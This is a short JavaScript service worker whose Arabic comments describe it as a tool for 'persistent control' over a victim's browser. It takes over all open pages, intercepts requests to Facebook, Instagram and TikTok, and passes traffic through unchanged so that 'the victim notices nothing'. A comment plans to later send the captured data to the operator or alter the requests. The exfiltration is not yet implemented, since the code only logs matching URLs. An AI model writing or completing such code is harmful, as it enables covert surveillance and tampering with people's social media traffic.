// sw.js - Service Worker للسيطرة المستمرة
self.addEventListener('install', (event) => {
  self.skipWaiting(); // يسيطر فورًا بدون انتظار
});

self.addEventListener('activate', (event) => {
  event.waitUntil(clients.claim()); // يسيطر على كل الصفحات المفتوحة
});

// اعتراض كل طلب (السيطرة الأساسية)
self.addEventListener('fetch', (event) => {
  // هنا نبدأ السيطرة: نعترض الطلبات الحساسة
  if (event.request.url.includes('facebook.com') || 
      event.request.url.includes('instagram.com') || 
      event.request.url.includes('tiktok.com')) {
    console.log('Sensitive request intercepted:', event.request.url);
    // في المستقبل هنا نرسل البيانات لك أو نغير الطلب
  }

  // نرجع الطلب عادي عشان الضحية ما يحسش بحاجة
  event.respondWith(fetch(event.request));
});
